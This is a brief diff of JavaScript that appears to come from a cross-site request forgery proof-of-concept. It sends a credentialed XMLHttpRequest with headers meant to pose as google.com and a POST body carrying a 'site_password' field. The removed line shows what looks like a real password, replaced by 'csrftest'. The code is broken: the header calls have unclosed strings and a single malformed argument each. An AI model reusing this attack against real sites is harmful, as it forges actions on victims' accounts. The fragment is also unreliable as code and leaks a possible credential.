@@ -13,7 +13,7 @@
         xhr.setRequestHeader("Referer: https://google.com)
         xhr.setRequestHeader("Origin: https://google.com)
         xhr.withCredentials = true;
-        var body = "ref=%2Faccount%2Fdashboard&site_password=redentry11558";
+        var body = "ref=%2Faccount%2Fdashboard&site_password=csrftest";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
